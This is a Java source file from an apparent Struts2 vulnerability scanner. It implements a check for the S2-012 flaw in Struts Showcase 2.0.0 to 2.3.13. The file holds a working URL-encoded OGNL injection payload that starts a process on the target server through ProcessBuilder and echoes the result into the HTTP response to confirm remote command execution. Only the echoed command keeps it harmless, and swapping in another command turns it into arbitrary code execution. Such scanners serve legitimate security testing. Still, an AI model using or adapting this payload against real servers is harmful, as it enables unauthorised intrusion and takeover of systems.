package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_012 implements Check {
    @Override
    public boolean check(String protocol, String host, int port, String path) throws Exception {
        Map<String,String> data = new HashMap<String,String>();

        int number = new Random(10000).nextInt(10000);
        String poc = "?name=%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%22echo%22%2c+%22"+number+"%22%7d)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b50000%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(new+java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d";

        if(path==null){
            path = "/index.action";
        }else if(!path.endsWith(".action")){
            path = path+"index.action";
        }

        String url = protocol+"://"+host+":"+port+path+poc;

        try {
            HttpResult result= HttpClient.get(url,data);;
            Pattern p = Pattern.compile(String.valueOf(number));
            Matcher m =p.matcher(result.getData());
            if(m.find()){
                return true;
            }else{
                return false;
            }
        }catch (Exception e){
            return false;
        }


    }

    public String printInfo(){
        String info = "[+] S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; GET请求发送数据，默认请求参数name";
        return info+"\n";
    }



    @Override
    public boolean check(URL u) throws Exception{

            return false;
        }



}
